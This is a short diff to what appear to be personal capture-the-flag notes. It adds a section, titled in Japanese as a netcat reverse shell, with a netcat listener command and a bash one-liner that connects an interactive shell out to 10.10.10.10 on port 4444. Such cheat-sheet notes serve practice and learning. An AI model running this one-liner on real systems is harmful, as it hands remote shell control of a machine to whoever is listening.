@@ -22,6 +22,18 @@ $ sudo docker-compose down --rmi all
 socat tcp-l:4444,reuseaddr,fork exec:'bash ./chall.sh'
 ```
 
+## netcat でリバースシェル
+
+**LOCAL**
+```zsh
+nc -nvlp 4444
+```
+
+**REMOTE**
+```zsh
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
+```
+
 ## Links
 
 - https://www.onlinegdb.com/online_python_compiler
